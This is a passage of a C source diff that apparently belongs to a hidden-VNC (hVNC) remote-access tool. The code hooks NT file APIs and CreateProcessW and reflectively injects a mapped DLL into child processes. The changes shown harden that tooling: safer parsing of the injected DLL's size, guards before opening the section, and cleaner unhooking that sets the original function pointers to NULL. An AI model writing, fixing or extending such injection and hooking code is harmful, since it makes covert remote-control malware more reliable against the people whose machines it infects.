+                    dllSizeLen = 0;
+                }
+
+                if (sectionNameLen > 0 && dllSizeLen > 0) {
+                    // Validate that every character is an ASCII digit before converting.
+                    // On non-English systems the string could theoretically contain locale-
+                    // specific digit characters (e.g. Arabic-Indic numerals) which would
+                    // cause the old subtraction-based parser to produce garbage values and
+                    // later crash when MapViewOfFile mapped the wrong size.
+                    BOOL allDigits = TRUE;
                     for (DWORD i = 0; i < dllSizeLen; i++) {
-                        g_DllRawSize = g_DllRawSize * 10 + (envDllSize[i] - L'0');
+                        if (envDllSize[i] < L'0' || envDllSize[i] > L'9') { allDigits = FALSE; break; }
+                    }
+                    if (allDigits) {
+                        WCHAR* endPtr = NULL;
+                        g_DllRawSize = (DWORD)wcstoul(envDllSize, &endPtr, 10);
+                    } else {
+                        g_DllRawSize = 0;
+                        CrashLog("[ENV] WARN: RDI_DLL_SIZE contains non-digit characters — child injection disabled");
                     }
 
+                    if (g_DllRawSize == 0) {
+                        CrashLog("[ENV] WARN: g_DllRawSize is 0 after parsing — skipping section open");
+                        goto skip_section_open;
+                    }
                     g_DllSectionHandle = OpenFileMappingW(FILE_MAP_READ, FALSE, envSectionName);
                     if (g_DllSectionHandle) {
                         g_DllRawBytes = MapViewOfFile(g_DllSectionHandle, FILE_MAP_READ, 0, 0, g_DllRawSize);
@@ -1095,6 +1300,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                             LogDebugA("[ENV] OpenFileMappingW failed for DLL section");
                         }
                     }
+                    skip_section_open:;
                 }
             }
             __except (EXCEPTION_EXECUTE_HANDLER) {
@@ -1249,13 +1455,36 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             CrashLog("=== Removing hooks ===");
             LogDebugA("=== Removing hooks ===");
             g_HooksInitialized = FALSE;
+
+            // Disable JMP patches in all target functions.
             MH_DisableHook(MH_ALL_HOOKS);
+
+            // Give any thread that passed the g_HooksInitialized guard but has not yet
+            // called Original*() a brief window to finish.  This is a best-effort
+            // mitigation; a proper fix requires a reader-writer barrier (e.g. SRWLOCK).
+            Sleep(50);
+
+            // Free trampoline memory.  After this point the Original* pointers are
+            // dangling.  NULL them immediately so any racing thread that calls through
+            // them gets a clean NULL-dereference AV (caught by the hook's __try/__except)
+            // rather than a use-after-free at an arbitrary freed address.
             MH_Uninitialize();
+
+            OriginalNtCreateFile             = NULL;
+            OriginalNtOpenFile               = NULL;
+            OriginalNtDeleteFile             = NULL;
+            OriginalNtSetInformationFile     = NULL;
+            OriginalNtQueryAttributesFile    = NULL;
+            OriginalNtQueryFullAttributesFile = NULL;
+            OriginalNtQueryDirectoryFile     = NULL;
+            OriginalNtQueryDirectoryFileEx   = NULL;
+            OriginalCreateProcessW           = NULL;
 
             if (g_DllRawBytes) {
                 UnmapViewOfFile(g_DllRawBytes);
                 g_DllRawBytes = NULL;
             }
+            g_DllRawSize = 0;
             if (g_DllSectionHandle) {
                 CloseHandle(g_DllSectionHandle);
                 g_DllSectionHandle = NULL;
